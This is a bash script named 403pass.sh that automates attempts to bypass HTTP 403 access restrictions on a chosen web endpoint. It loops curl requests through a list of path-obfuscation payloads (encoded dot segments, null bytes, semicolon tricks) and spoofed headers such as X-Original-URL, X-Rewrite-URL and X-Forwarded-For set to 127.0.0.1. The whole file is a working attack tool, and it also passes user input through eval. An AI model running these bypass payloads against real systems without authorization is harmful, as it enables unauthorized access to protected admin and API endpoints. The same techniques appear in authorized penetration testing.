#!/bin/bash

# usage: ./403pass.sh https://example.com /api/admin PATCH "Authorization: Bearer eyJhb..." http://127.0.0.1:8080

if ! command -v curl &>/dev/null; then
    echo "[!] curl not found bro, install it :3"
    exit 1
fi

# check arguments
if [ "$#" -lt 3 ] || [ "$#" -gt 5 ]; then
    echo "Usage: $0 <base-url> <endpoint> <http-method> [CUSTOM_HEADER] [proxy]"
    echo "Example: $0 https://example.com /api/admin PATCH 'Authorization: Bearer eyJhb...'  http://127.0.0.1:8080"
    exit 1
fi

URL=$1
ENDPOINT=$2
METHOD=$3
CUSTOM_HEADER=$4
PROXY=${5:-""}
#CUSTOM_HEADER=$5

URL="${URL%/}"
TARGET="$ENDPOINT"

CUSTOM_HEADER_OPTION=""
if [ -n "$CUSTOM_HEADER" ]; then
    CUSTOM_HEADER_OPTION="-H '$CUSTOM_HEADER'"
    echo "[*] custom header set: $CUSTOM_HEADER"
fi

PROXY_OPTION=""
if [ -n "$PROXY" ]; then
    PROXY_OPTION="--proxy $PROXY"
    echo "[*] proxy set: $PROXY"
fi

# URI payloads
URI_PAYLOADS=(
    "$TARGET"
    "$TARGET/"
    "$TARGET//"
    "/./$TARGET"
    "$TARGET/."
    "$TARGET..;/"
    "$TARGET;/"
    "$TARGET%20"
    "$TARGET%09"
    "$TARGET%00"
    "$TARGET%2e/"
    "$TARGET/%2e"
    "$TARGET/%252e"
    "/%2e$TARGET"
    "$TARGET..%00/"
    "$TARGET%2e%2e/"
    "$TARGET/%ef%bc%8f"
    "$TARGET/..%00/"
    "$TARGET%2e%2e%2f"
    "$TARGET%2f.."
)

# header payloads
HEADER_SETS=(
    ""
    "-H 'X-Original-URL: $TARGET'"
    "-H 'X-Rewrite-URL: $TARGET'"
    "-H 'X-Original-URL: $URL'"
    "-H 'X-Rewrite-URL: $URL'"
    "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
    "-H 'X-Forwarded-For: 127.0.0.1'"
    "-H 'X-Client-IP: 127.0.0.1'"
    "-H 'X-Host: 127.0.0.1'"
    "-H 'X-Forwarded-Host: 127.0.0.1'"
    "-H 'X-Remote-IP: 127.0.0.1'"
    "-H 'X-Remote-Addr: 127.0.0.1'"
)

UA="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.4 Safari/537.36"

echo "[*] Starting 403 bypass attempts..."
echo "[*] Target: $URL$TARGET"
echo "[*] Method: $METHOD"
echo "[*] Payloads: ${#URI_PAYLOADS[@]} URI variants × ${#HEADER_SETS[@]} header sets"
echo

# echo "[*] full url check: curl -k -s -o /dev/null -iL -w 'Status: %{http_code}\n' -A \"$UA\" -X $METHOD $header $PROXY_OPTION $CUSTOM_HEADER \"$URL$TARGET\""

# loop through header payloads
for header in "${HEADER_SETS[@]}"; do
    #echo "[*] full url check: curl -k -s -o /dev/null -iL -w 'Status: %{http_code}\n' -A \"$UA\" -X $METHOD $header $PROXY_OPTION $CUSTOM_HEADER_OPTION \"$URL$TARGET\""
    #echo
    echo "[>] Trying: $METHOD $URL$TARGET $(echo $header)"
    eval "curl -k -s -o /dev/null -iL -w 'Status: %{http_code}\n' -A \"$UA\" -X $METHOD $header $PROXY_OPTION $CUSTOM_HEADER_OPTION \"$URL$TARGET\""
    echo
done

# loop through uri payloads
for uri in "${URI_PAYLOADS[@]}"; do
    echo "[>] Trying: $METHOD $URL$uri"
    eval "curl -k -s -o /dev/null -iL -w 'Status: %{http_code}\n' -A \"$UA\" -X $METHOD $PROXY_OPTION $CUSTOM_HEADER_OPTION \"$URL$uri\""
    echo
done

echo "[+] all done :3"

